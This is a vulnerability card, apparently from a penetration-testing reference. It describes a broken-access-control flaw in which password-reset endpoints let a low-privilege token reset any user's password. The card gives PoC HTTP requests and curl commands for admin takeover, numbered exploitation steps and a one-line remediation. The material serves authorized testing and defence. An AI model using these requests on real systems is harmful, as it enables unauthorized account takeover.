---
title: Broken access control in the admin "reset any user's password" endpoint (direct member/admin takeover)
cve: None (business logic)
severity: critical
cvss: 9.2
product: Custom backend (member management / agent management)
versions: Any
ports: 80, 443
keywords: password reset, arbitrary user, broken access control, admin, takeover
entry: /api/admin/user/resetPassword  /api/agent/resetPwd
verified: false
sources: Compiled from public sources (business logic; no CVE)
---

## Fingerprints

```
POST /api/admin/user/resetPassword {"uid":1001,"password":"..."}
POST /api/user/updatePwd            {"uid":...,"oldPwd":"","newPwd":"..."}
```

## Prerequisites

- A low-privilege backend account (support/agent) or a regular member token.

## PoC

```http
### 1) Attempt to reset another user's password with a low-privilege account
POST /api/admin/user/resetPassword HTTP/1.1
Authorization: Bearer <low-privilege-token>

{"uid":1,"password":"Passw0rd!2026"}
```

```bash
# 2) Confirm success: log in to the target account with the new password
curl -s -X POST 'https://target/api/login' -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"Passw0rd!2026"}' | head -c 200

# 3) If the endpoint checks oldPwd, pass an empty value or omit it
curl -s -X POST 'https://target/api/user/updatePwd' -H "Authorization: Bearer <t>" \
  -H 'Content-Type: application/json' -d '{"uid":1,"newPwd":"Passw0rd!2026"}'
```

## Exploitation Steps

1. First verify endpoint behavior using your own account (change your own password);
2. Change uid to target another account; success means administrator takeover;
3. Immediately record the change and roll it back (restore the password) to avoid business disruption;
4. Evidence: the reset request + successful login with the new password.

## Remediation and Mitigation

- Restrict resets to superadmins + step-up authentication + auditing; disallow specifying uid in the request body (derive it from the token).

## References

- OWASP API5 BFLA；CWE-639。
